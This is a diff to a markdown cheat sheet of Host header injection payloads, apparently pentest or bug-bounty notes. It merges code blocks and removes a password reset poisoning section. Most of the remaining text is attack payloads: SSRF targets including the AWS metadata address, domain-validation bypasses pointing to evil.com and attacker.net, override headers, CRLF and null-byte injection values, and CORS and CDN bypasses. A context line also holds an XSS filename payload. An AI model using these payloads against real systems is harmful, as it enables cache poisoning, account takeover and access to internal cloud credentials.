@@ -698,22 +698,8 @@ abc"><img src=x onerror=alert(1)>.jpeg
 Referer: https://www.bing.com/
 Try to change host and referer header because few host is verify for referer header information. 
 also do the same first three attack to insert the referer header (Change referer header)
-```
-```
-## Password Reset Poisoning
-- Obtain a **password reset link**.
-- Modify the `Host` header.
 
-## Host Header Injection on Referer Header
-- Modify headers:
-  ```http
-  Referer: https://www.bing.com/
-  ```
-
-## 7. Subdomain-Based Host Header Injection
-- Use existing and non-existing subdomains to inject headers.
-
-## 8. Advanced Host Header Attacks
+## Advanced Host Header Attacks
 ### Internal Host Access:
 ```http
 GET / HTTP/1.1
@@ -791,116 +777,48 @@ Content-Type: application/json
 
 ```
 Host: 127.0.0.1
-```
-
-```
 Host: 169.254.169.254   # AWS metadata
-```
-
-```
 Host: localhost
+---
 ```
-
----
-
-# **3. Bypass Testcases (Advanced)**
-
-Below are full bypass patterns to defeat filters, WAF, and strict host validation logic.
-
----
-
 # 🔥 **3.1 Domain Validation Bypass Payloads**
 
 ### Case: Application checks `endswith("target.com")` incorrectly
 
 ```
 Host: target.com.evil.io
-```
-
-```
 Host: target.com.attacker.net
-```
-
-```
 Host: evil.com?target.com
-```
-
-```
 Host: target.com#evil.com
 ```
-
----
-
 # 🔥 **3.2 Header Override Bypass**
 
 Some applications prioritize these headers over `Host:`:
 
 ```
 X-Forwarded-Host: evil.com
-```
-
-```
 X-Host: attacker.com
-```
-
-```
 X-Forwarded-Server: evil.com
-```
-
-```
 X-HTTP-Host-Override: evil.com
 ```
-
-Combine:
-
-```
-Host: trusted.com
-X-Forwarded-Host: evil.com
-```
-
----
 
 # 🔥 **3.3 Port-Based Bypass**
 
 ```
 Host: target.com:443
-```
-
-```
 Host: target.com:80
-```
-
-```
 Host: target.com:8080
-```
-
-```
 Host: target.com:*
 ```
-
-These bypass strict host comparisons.
-
----
 
 # 🔥 **3.4 Whitespace / Tab Injection Bypass**
 
 ```
 Host: evil.com%20
-```
-
-```
 Host: evil.com%0d%0aInjected: yes
-```
-
-```
 Host: evil.com\t
-```
-
-```
 Host: evil.com\r\nX-Test: 123
 ```
-
----
 
 # 🔥 **3.5 Unicode / Encoding Bypass Cases**
 
@@ -965,18 +883,9 @@ Some servers will parse the last one; some the first.
 
 ```
 Host: evil.com%00target.com
-```
-
-```
 Host: target.com%00.evil.com
-```
-
-```
 Host: target.com\evil.com
 ```
-
----
-
 # 🔥 **3.8 CORS Bypass Using Host Reflection**
 
 Check if server reflects Host header into CORS:
@@ -985,20 +894,12 @@ Check if server reflects Host header into CORS:
 Host: evil.com
 Origin: http://evil.com
 ```
-
----
-
 # 🔥 **3.9 CDN / Proxy Bypass (Akamai, Cloudflare, Nginx)**
 
 ```
 Forwarded: host=evil.com
-```
-
-```
 X-Forwarded-Host: internal-admin
 ```
-
----
 
 # ✔ **4. Combined Master Payload (All-in-One Fuzzer)**
 
